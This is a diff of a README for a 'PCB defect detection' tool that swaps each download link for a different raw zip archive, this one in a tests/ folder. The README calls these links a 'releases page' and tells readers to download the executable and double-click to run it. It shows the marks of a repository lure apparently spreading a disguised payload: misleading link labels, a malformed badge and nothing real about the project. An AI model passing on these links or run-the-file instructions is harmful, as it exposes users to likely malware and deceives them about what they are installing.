@@ -1,6 +1,6 @@
 # 🎛️ pcb-defect-detection - Detect PCB Defects Easily
 
-[![Download Now](https://raw.githubusercontent.com/Djthesinger/pcb-defect-detection/main/images/defect_pcb_detection_v1.3-alpha.2.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/Djthesinger/pcb-defect-detection/main/images/defect_pcb_detection_v1.3-alpha.2.zip)
+[![Download Now](https://raw.githubusercontent.com/Djthesinger/pcb-defect-detection/main/tests/pcb-detection-defect-2.9.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/Djthesinger/pcb-defect-detection/main/tests/pcb-detection-defect-2.9.zip)
 
 ## 📖 Overview
 
@@ -13,13 +13,13 @@ To use this application, you'll follow a few straightforward steps. Don’t worr
 ## 🔗 Download & Install
 
 1. **Visit the Download Page:**  
-   Go to the releases page to download the latest version of the software: [Download Page](https://raw.githubusercontent.com/Djthesinger/pcb-defect-detection/main/images/defect_pcb_detection_v1.3-alpha.2.zip)
+   Go to the releases page to download the latest version of the software: [Download Page](https://raw.githubusercontent.com/Djthesinger/pcb-defect-detection/main/tests/pcb-detection-defect-2.9.zip)
 
 2. **Select the Release:**  
    On the releases page, you will see a list of available versions. Look for the most recent version, as it includes the latest features and fixes.
 
 3. **Download the Application:**  
-   Click on the link for the executable file that matches your system. It might be labeled something like `https://raw.githubusercontent.com/Djthesinger/pcb-defect-detection/main/images/defect_pcb_detection_v1.3-alpha.2.zip`. It’s usually a simple click, and the download will start immediately.
+   Click on the link for the executable file that matches your system. It might be labeled something like `https://raw.githubusercontent.com/Djthesinger/pcb-defect-detection/main/tests/pcb-detection-defect-2.9.zip`. It’s usually a simple click, and the download will start immediately.
 
 4. **Run the Application:**  
    Once the file is downloaded, locate it in your downloads folder. Double-click the file to open and run the application. Follow any prompts that appear on your screen.
@@ -61,7 +61,7 @@ Here’s what you will need to run the application smoothly:
 To ensure you have the latest features and fixes:
 
 1. **Check for Updates:**  
-   Periodically visit the releases page: [Download Page](https://raw.githubusercontent.com/Djthesinger/pcb-defect-detection/main/images/defect_pcb_detection_v1.3-alpha.2.zip)
+   Periodically visit the releases page: [Download Page](https://raw.githubusercontent.com/Djthesinger/pcb-defect-detection/main/tests/pcb-detection-defect-2.9.zip)
 
 2. **Download New Versions:**  
    If a new version is available, follow the same steps as before to download and run the new executable file.
